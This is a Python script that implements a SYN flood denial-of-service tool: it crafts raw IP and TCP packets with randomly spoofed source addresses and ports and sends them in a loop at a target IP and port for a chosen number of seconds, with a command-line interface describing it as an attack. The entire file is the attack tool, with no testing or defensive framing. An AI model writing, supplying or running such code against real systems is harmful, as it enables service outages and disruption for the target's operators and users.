import socket
import random
import time
import argparse
import struct
import sys

def create_ip_header(src_ip, dest_ip):
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 0
    ip_id = random.randint(0, 65535)
    ip_frag_off = 0
    ip_ttl = 255
    ip_protocol = socket.IPPROTO_TCP
    ip_check = 0
    ip_src = socket.inet_aton(src_ip)
    ip_dest = socket.inet_aton(dest_ip)

    ip_header = struct.pack('!BBHHHBBH4s4s',
                            (ip_ver << 4) + ip_ihl,
                            ip_tos,
                            ip_tot_len,
                            ip_id,
                            ip_frag_off,
                            ip_ttl,
                            ip_protocol,
                            ip_check,
                            ip_src,
                            ip_dest)
    return ip_header

def create_tcp_header(src_port, dest_port):
    tcp_seq = 0
    tcp_ack_seq = 0
    tcp_off = 5
    tcp_flags = 0x02
    tcp_window = socket.htons(5840)
    tcp_check = 0
    tcp_urg_ptr = 0

    tcp_header = struct.pack('!HHLLBBHHH',
                             src_port,
                             dest_port,
                             tcp_seq,
                             tcp_ack_seq,
                             (tcp_off << 4),
                             tcp_flags,
                             tcp_window,
                             tcp_check,
                             tcp_urg_ptr)
    return tcp_header

def syn_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            src_port = random.randint(1024, 65535)

            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            ip_header = create_ip_header(src_ip, target_ip)
            tcp_header = create_tcp_header(src_port, target_port)

            packet = ip_header + tcp_header
            sock.sendto(packet, (target_ip, 0))
            print(f"Sent SYN packet from {src_ip}:{src_port} to {target_ip}:{target_port}")

        except Exception as e:
            print(f"Error sending packet: {e}")

def parse_args():
    parser = argparse.ArgumentParser(description="Perform SYN Flood on a target IP.")
    parser.add_argument('ip', type=str, help="Target IP address")
    parser.add_argument('port', type=int, help="Target port number")
    parser.add_argument('duration', type=int, help="Duration of the attack in seconds")
    return parser.parse_args()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python p.py <ip> <port> <duration>")
        sys.exit(1)

    args = parse_args()
    syn_flood(args.ip, args.port, args.duration)
